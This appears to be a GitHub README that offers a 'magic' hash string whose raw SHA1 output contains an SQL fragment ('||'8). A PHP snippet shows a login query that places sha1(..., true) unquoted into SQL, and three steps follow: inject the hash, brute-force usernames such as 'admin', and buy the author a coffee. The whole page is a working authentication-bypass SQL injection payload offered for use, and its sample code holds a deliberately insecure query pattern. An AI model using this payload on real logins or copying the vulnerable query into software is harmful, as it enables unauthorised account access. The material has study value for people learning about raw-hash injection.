# SHA1_RAW_SQL

| Hash string                | SHA1 Hash                                     | Raw output            |Query   |Author    |
| -------------------------- |:---------------------------------------------:|:---------------------:|:------:|:--------:|
| 5651578060603509           |96009c0bafe7be05e23b0079226f7222d82fee88       |E&�ɶ��'\|\|'8�vjc\�   |'\|\|'8 |0xJohannes|


#  EXAMPLE USAGE

```php
<?php

...SOME CODE...

function escape_sql()
  {
    ...sql escape...
  }
  
$pass = sha1($_POST['pass'], true);

$log = escape_sql($_POST'log']);

$sql = "select * from tablename where password=$pass AND username=$log";

...SOME CODE...
?>
```
* The first step is to inject one of suitable hashes.
* The second move is bruteforcing the login value i.e, (admin, 4dm1n and so on)
* The final step is buying me a coffee :D [![Coffee](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](buymeacoff.ee/Wo30ewVvi)
